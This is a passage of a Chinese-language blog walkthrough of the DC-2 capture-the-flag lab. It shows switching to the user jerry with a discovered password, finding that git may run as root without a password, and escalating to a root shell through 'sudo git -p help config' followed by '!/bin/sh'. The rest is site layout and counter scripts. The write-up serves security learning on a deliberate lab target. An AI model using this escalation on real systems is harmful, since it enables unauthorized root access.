+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span></span></code></pre>
+<p>提示我们切换用户到jerry，密码就是<code>adipiscing</code></p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/21.png" class=""></p>
+<p>在<code>/home/jerry</code>目录下发现了flag4.txt</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Good to see that you've made it this far - but you're not home yet. </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>You still need to get the final flag (the only flag that really counts!!!).  </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>No hints here - you're on your own now.  :-)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Go on - git outta here!!!!</span></span></code></pre>
+<p>这里提示是git提权</p>
+<h1 id="git提权"><a class="anchor" href="#git提权">#</a> git提权</h1>
+<p>Git提权是指攻击者利用Git的某些功能，结合Linux系统中不安全的权限配置，讲普通用户权限提升为更高权限</p>
+<p>Git本身是版本控制工具，但它还有调用外部程序的能力：</p>
+<ul>
+<li>使用less分页显示内容</li>
+<li>调用编辑器修改提交信息</li>
+<li>使用Git Hooks执行脚本</li>
+<li>调用外部命令完成Git操作</li>
+</ul>
+<p>如果系统允许普通用户通过<code>sudo</code>以root身份运行Git，就可以通过这些功能简介执行高权限命令</p>
+<h2 id="检查sudo权限"><a class="anchor" href="#检查sudo权限">#</a> 检查sudo权限</h2>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>sudo -l</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/22.png" class=""></p>
+<p>看到返回：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>User jerry may run the following commands on DC-2:</span></span>
+<span class="line"><span>    (root) NOPASSWD: /usr/bin/git</span></span></code></pre>
+<p>说明用户jerry可以不输入密码，以root身份执行<code>/usr/bin/git</code></p>
+<h2 id="利用git的分页器"><a class="anchor" href="#利用git的分页器">#</a> 利用Git的分页器</h2>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>sudo git -p help config</span></span></code></pre>
+<p><code>-p</code>表示启用分页显示，<code>help config</code>表示查看Git配置帮助，在相应环境中，这可能启动Git配置帮助</p>
+<p>其原理为Git的help命令特性：Git的help子命令会调用<code>less</code>或<code>vi</code>等文本查看器显示帮助文档，通过在这些编辑器中触发shell执行命令（如<code>!command</code>）可以绕过权限控制，直接以root身份执行命令</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/23.png" class=""></p>
+<p>在之前绕过Restricted shell中我们知道了<code>!/bin/sh</code>的作用，在这里我们尝试执行</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/24.png" class=""></p>
+<p>成功实现提权，最后在<code>/root</code>目录下找到<code>final-flag.txt</code>文件</p>
+<p><img loading="lazy" src="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/25.png" class=""></p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-11-03 17:23:58" itemprop="dateModified" datetime="2026-11-03T17:23:58+08:00">2026-11-03</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>梧桐虽立，其心以空，待发于春，实葬于冬</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/" title="DC-2靶场日记">https://zlaryy.top/2026/11/03/DC-2靶场日记/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/10/17/CRYPTO/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture2.webp" title="CRYPTO-PART1"><span class="type">上一篇</span><h3>CRYPTO-PART1</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dc-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text"> DC-2靶场日记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip%E5%B9%B6%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.</span> <span class="toc-text"> 寻找靶机IP并探测端口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text"> 信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87restricted-shell"><span class="toc-number">4.</span> <span class="toc-text"> 绕过Restricted shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BElinux%E7%8E%AF%E5%A2%83"><span class="toc-number">4.1.</span> <span class="toc-text"> 枚举Linux环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF"><span class="toc-number">4.2.</span> <span class="toc-text"> 常见利用技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E8%A2%AB%E5%85%81%E8%AE%B8"><span class="toc-number">4.2.1.</span> <span class="toc-text"> &#x2F;字符被允许</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cp%E5%91%BD%E4%BB%A4%E8%A2%AB%E5%85%81%E8%AE%B8"><span class="toc-number">4.2.2.</span> <span class="toc-text"> cp命令被允许</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%BA%94%E7%94%A8"><span class="toc-number">4.2.3.</span> <span class="toc-text"> 探测应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-shell"><span class="toc-number">4.2.4.</span> <span class="toc-text"> set shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9path%E6%88%96shell%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">4.2.5.</span> <span class="toc-text"> 更改PATH或SHELL环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80"><span class="toc-number">4.2.6.</span> <span class="toc-text"> 编程语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E6%96%B0%E6%8A%80%E6%9C%AF"><span class="toc-number">4.2.7.</span> <span class="toc-text"> 最新技术</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7"><span class="toc-number">5.</span> <span class="toc-text"> 切换用户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#git%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text"> git提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5sudo%E6%9D%83%E9%99%90"><span class="toc-number">6.1.</span> <span class="toc-text"> 检查sudo权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8git%E7%9A%84%E5%88%86%E9%A1%B5%E5%99%A8"><span class="toc-number">6.2.</span> <span class="toc-text"> 利用Git的分页器</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / AI安全 / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">26</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/10/17/CRYPTO/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/19/Linux%E6%8F%90%E6%9D%83/">Linux提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/">低版本php下信息泄露的CVE漏洞与反弹shell</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">SSTI模板注入</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/10/17/CRYPTO/">CRYPTO-PART1</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/24/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Node.js原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/09/24/AI%20Security%E5%9F%BA%E7%A1%80/">AI Security基础</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/">常规外网打点-PART2</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/">DC-2靶场日记</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">660k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">10:01</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2026/11/03/DC-2靶场日记/`,
+    favicon: {
+        show: `ZLARYY`,
+        hide: `ZLARYY`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer></script><!-- hexo injector body_end start -->
+<script id="post-stats">
+(function () {
+  var API_NAME = 'ZLARYYPostStats';
+  var BOX_SELECTOR = '.post-stats-box';
+  var COUNT_LIMIT = 9999;
+
+  if (window[API_NAME] && typeof window[API_NAME].run === 'function') {
+    window[API_NAME].run();
+    return;
+  }
+
+  function isPostPage() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function storageKey(prefix) {
+    return prefix + window.location.pathname;
+  }
+
+  function getStorageValue(storage, key) {
+    try {
+      return storage.getItem(key);
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function setStorageValue(storage, key, value) {
+    try {
+      storage.setItem(key, value);
+    } catch (error) {}
+  }
+
+  function removeStorageValue(storage, key) {
+    try {
+      storage.removeItem(key);
+    } catch (error) {}
+  }
+
+  function readCount(key) {
+    var raw = getStorageValue(window.localStorage, key);
+    var value = raw === null || raw === '' ? 0 : Number(raw);
+
+    if (!Number.isInteger(value) || value < 0 || value > COUNT_LIMIT) {
+      value = 0;
+      setStorageValue(window.localStorage, key, '0');
+    }
+
+    return value;
+  }
+
+  function writeCount(key, value) {
+    setStorageValue(window.localStorage, key, String(value));
+  }
+
+  function readLikeCount() {
+    return readCount(storageKey('zlaryy_like_count_'));
+  }
+
+  function hasLiked() {
+    return getStorageValue(window.localStorage, storageKey('zlaryy_liked_')) === '1';
+  }
+
+  function saveLikeState(count, liked) {
+    writeCount(storageKey('zlaryy_like_count_'), count);
+    if (liked) {
+      setStorageValue(window.localStorage, storageKey('zlaryy_liked_'), '1');
+    } else {
+      removeStorageValue(window.localStorage, storageKey('zlaryy_liked_'));
+    }
+  }
+
+  function clearRewardNodes() {
+    document.querySelectorAll('.reward').forEach(function (reward) {
+      reward.innerHTML = '';
+      reward.classList.add('post-stats-host');
+      reward.removeAttribute('style');
+      reward.setAttribute('aria-label', 'post stats');
+    });
+  }
+
+  function findInsertTarget() {
+    var reward = document.querySelector('article.post .reward, .reward');
+    if (reward) return { parent: reward, before: null };
+
+    var footer = document.querySelector('article.post > footer');
+    if (footer && footer.parentNode) return { parent: footer.parentNode, before: footer };
+
+    var article = document.querySelector('article.post');
+    if (article) return { parent: article, before: null };
+
+    return null;
+  }
+
+  function createStatsBox(viewCount, likeCount, liked) {
+    var box = document.createElement('div');
+    box.className = 'post-stats-box';
+    box.innerHTML = [
+      '<button class="post-view-count" type="button" disabled aria-disabled="true">',
+      '&#128065; &#x770b;&#x8fc7; <span class="zlaryy-pageview-count">' + viewCount + '</span> &#x6b21;',
+      '</button>',
+      '<button class="post-like-btn' + (liked ? ' liked' : '') + '" type="button" aria-pressed="' + (liked ? 'true' : 'false') + '">',
+      '<span class="post-like-label">' + (liked ? '&#x5df2;&#x70b9;&#x8d5e;' : '&#x70b9;&#x8d5e;') + '</span> ',
+      '<span class="local-like-count">' + likeCount + '</span>',
+      '</button>'
+    ].join('');
+
+    return box;
+  }
+
+  function updateLikeButton(button, count, liked) {
+    var labelNode = button.querySelector('.post-like-label');
+    var countNode = button.querySelector('.local-like-count');
+
+    if (labelNode) labelNode.textContent = liked ? '\u5df2\u70b9\u8d5e' : '\u70b9\u8d5e';
+    if (countNode) countNode.textContent = String(count);
+
+    button.classList.toggle('liked', liked);
+    button.setAttribute('aria-pressed', liked ? 'true' : 'false');
+  }
+
+  function bindLikeButton(box) {
+    var button = box.querySelector('.post-like-btn');
+    if (!button || button.dataset.bound === 'true') return;
+
+    updateLikeButton(button, readLikeCount(), hasLiked());
+
+    button.dataset.bound = 'true';
+    button.addEventListener('click', function () {
+      var count = readLikeCount();
+
+      if (hasLiked()) {
+        count = Math.max(0, count - 1);
+        saveLikeState(count, false);
+        updateLikeButton(button, count, false);
+        return;
+      }
+
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      saveLikeState(count, true);
+      updateLikeButton(button, count, true);
+    });
+  }
+
+  function renderStats() {
+    if (!isPostPage()) return;
+
+    clearRewardNodes();
+
+    var viewCount = '—';
+    var likeCount = readLikeCount();
+    var liked = hasLiked();
+    var box = document.querySelector(BOX_SELECTOR);
+
+    if (!box) {
+      var target = findInsertTarget();
+      if (!target) return;
+
+      box = createStatsBox(viewCount, likeCount, liked);
+      target.parent.insertBefore(box, target.before);
+    }
+
+    var likeNode = box.querySelector('.local-like-count');
+    var likeButton = box.querySelector('.post-like-btn');
+
+    if (likeNode) likeNode.textContent = String(likeCount);
+    if (likeButton) {
+      updateLikeButton(likeButton, likeCount, liked);
+    }
+
+    bindLikeButton(box);
+    document.dispatchEvent(new Event('zlaryy:stats-ready'));
+  }
+
+  function runPostStats() {
+    window.setTimeout(renderStats, 0);
+  }
+
+  window[API_NAME] = {
+    run: runPostStats
+  };
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', runPostStats);
+  } else {
+    runPostStats();
+  }
+
+  document.addEventListener('pjax:complete', runPostStats);
+})();
+</script>
+  
+<script>
+(function () {
+  function addBeian() {
+    const footerStatus = document.querySelector('#footer .status');
+    if (!footerStatus) return;
+
+    if (document.querySelector('.footer-beian')) return;
+
+    const beian = document.createElement('div');
+    beian.className = 'footer-beian';
+    beian.innerHTML = '<a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener">蜀ICP备2026016552号-1</a>';
+
+    footerStatus.appendChild(beian);
+  }
+
+  addBeian();
+  document.addEventListener('pjax:complete', addBeian);
+})();
+</script>
+  <script id="zlaryy-article-views">(function articleViewsClient(options) {
+  if (window.ZLARYYArticleViews) {
+    window.ZLARYYArticleViews.refresh();
+    return;
+  }
+
+  var counts = new Map();
+  var recordedPath = null;
+  var requestId = 0;
+  var activeController = null;
+  var pendingPath = null;
+  var serverURL = (options.serverURL || '').replace(/\/+$/, '');
+
+  function normalPath(value) {
+    var url;
+    try {
+      url = new URL(value, window.location.href);
+      var siteOrigin = new URL(options.siteURL).origin;
+      if (url.origin !== window.location.origin && url.origin !== siteOrigin) return null;
+      return url.pathname.replace(/\/index\.html$/, '/').split('/').map(function (part) {
+        try {
+          return encodeURIComponent(decodeURIComponent(part).normalize('NFC'));
+        } catch (error) {
+          return part;
+        }
+      }).join('/');
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function currentPath() {
+    var canonical = document.querySelector('link[rel="canonical"]');
+    return normalPath(canonical ? canonical.href : window.location.href);
+  }
+
+  function isPost() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function addCounter(meta, path, full) {
+    if (!meta || !path || meta.querySelector('.zlaryy-view-item')) return;
+    var item = document.createElement('span');
+    item.className = 'item zlaryy-view-item';
+    item.title = '累计浏览次数';
+    item.innerHTML =
+      '<span class="icon"><i class="ic i-eye"></i></span>' +
+      (full ? '<span class="text">浏览量</span>' : '') +
+      '<span class="zlaryy-pageview-count">—</span>' +
+      '<span class="text">次</span>';
+    item.querySelector('.zlaryy-pageview-count').dataset.path = path;
+    meta.appendChild(item);
+  }
+
+  function collectCounters() {
+    document.querySelectorAll('.segments article.item').forEach(function (card) {
+      var link = card.querySelector('.info h3 a[href]');
+      if (link) addCounter(card.querySelector('.info > .meta'), normalPath(link.href), false);
+    });
+    if (isPost()) {
+      var path = currentPath();
+      addCounter(document.querySelector('#header #brand .meta'), path, true);
+      document.querySelectorAll('article.post .post-view-count .zlaryy-pageview-count')
+        .forEach(function (element) { element.dataset.path = path; });
+    }
+    return Array.from(document.querySelectorAll('.zlaryy-pageview-count[data-path]'));
+  }
+
+  function render() {
+    collectCounters().forEach(function (element) {
+      var count = counts.get(element.dataset.path);
+      element.textContent = typeof count === 'number' ? String(count) : '—';
+      element.title = typeof count === 'number' ? '累计浏览次数' : '浏览量暂不可用';
+    });
+  }
+
+  async function counterRequest(query, body, signal) {
+    var url = new URL(serverURL + '/api/article');
+    url.searchParams.set('lang', 'zh-CN');
+    if (query) {
+      url.searchParams.set('path', query.join(','));
+      url.searchParams.set('type', 'time');
+    }
+    var response = await fetch(url.href, {
+      method: body ? 'POST' : 'GET',
+      headers: body ? { 'Content-Type': 'application/json' } : undefined,
+      body: body ? JSON.stringify(body) : undefined,
+      credentials: 'omit',
+      cache: 'no-store',
+      signal: signal
+    });
+    if (!response.ok) throw new Error('Counter HTTP ' + response.status);
+    var result = await response.json();
+    if (result.errno || !Array.isArray(result.data)) throw new Error('Invalid counter response');
+    return result.data;
+  }
+
+  function validCount(row) {
+    if (!row || !Number.isSafeInteger(row.time) || row.time < 0) {
+      throw new Error('Invalid pageview count');
+    }
+    return row.time;
+  }
+
+  async function refresh() {
+    var elements = collectCounters();
+    var path = currentPath();
+    var post = isPost();
+    render();
+    if (!post) recordedPath = null;
+    if (!serverURL || !elements.length || !path) return;
+    if (pendingPath === path) return;
+    pendingPath = path;
+
+    // Local previews only read totals; they must not increase the live counter.
+    var siteHost = new URL(options.siteURL).hostname;
+    var countVisit = post && (window.location.hostname === siteHost || options.countPreview);
+    var increment = countVisit && recordedPath !== path;
+    if (increment) recordedPath = path;
+
+    var paths = Array.from(new Set(elements.map(function (element) {
+      return element.dataset.path;
+    }))).filter(function (item) { return !increment || item !== path; });
+
+    var id = ++requestId;
+    if (activeController) activeController.abort();
+    var controller = new AbortController();
+    activeController = controller;
+    var timeout = window.setTimeout(function () { controller.abort(); }, 10000);
+    var jobs = [];
+
+    if (increment) {
+      jobs.push(counterRequest(null, { path: path, type: 'time', action: 'inc' }, controller.signal)
+        .then(function (rows) {
+          var count = validCount(rows[0]);
+          if (id === requestId) { counts.set(path, count); render(); }
+        }));
+    }
+    if (paths.length) {
+      jobs.push(counterRequest(paths, null, controller.signal).then(function (rows) {
+        if (rows.length !== paths.length) throw new Error('Incomplete counter response');
+        var values = rows.map(validCount);
+        if (id === requestId) {
+          paths.forEach(function (item, index) { counts.set(item, values[index]); });
+          render();
+        }
+      }));
+    }
+    try {
+      var results = await Promise.allSettled(jobs);
+      if (id === requestId && results.some(function (result) { return result.status === 'rejected'; })) {
+        console.warn('文章浏览量暂不可用。');
+      }
+    } finally {
+      window.clearTimeout(timeout);
+      if (id === requestId) { pendingPath = null; activeController = null; }
+    }
+  }
+
+  window.ZLARYYArticleViews = { refresh: refresh, render: render };
+  // The existing like button script creates its stats area after DOMContentLoaded.
+  document.addEventListener('zlaryy:stats-ready', render);
+  document.addEventListener('pjax:complete', function () { window.setTimeout(refresh, 0); });
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refresh, { once: true });
+  } else {
+    refresh();
+  }
+})({"enable":true,"serverURL":"https://zlaryy-waline.vercel.app","siteURL":"https://zlaryy.top","countPreview":false});</script><script>
+(function () {
+  function fixText(text) {
+    if (!text) return text;
+    text = text.replace(/\([`´]?Д[`´]?\)大変だ!/g, "ZLARYY");
+    text = text.replace(/大変だ!/g, "ZLARYY");
+    return text;
+  }
+
+  function replaceText(root) {
+    root = root || document.body;
+    if (!root) return;
+
+    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+    var node;
+
+    while ((node = walker.nextNode())) {
+      var oldText = node.nodeValue;
+      var newText = fixText(oldText);
+      if (newText !== oldText) node.nodeValue = newText;
+    }
+  }
+
+  function init() {
+    replaceText(document.body);
+
+    var observer = new MutationObserver(function (mutations) {
+      mutations.forEach(function (mutation) {
+        mutation.addedNodes.forEach(function (node) {
+          if (node.nodeType === 1) {
+            replaceText(node);
+          } else if (node.nodeType === 3) {
+            node.nodeValue = fixText(node.nodeValue);
+          }
+        });
+      });
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
+</script><!-- hexo injector body_end end --></body></html>
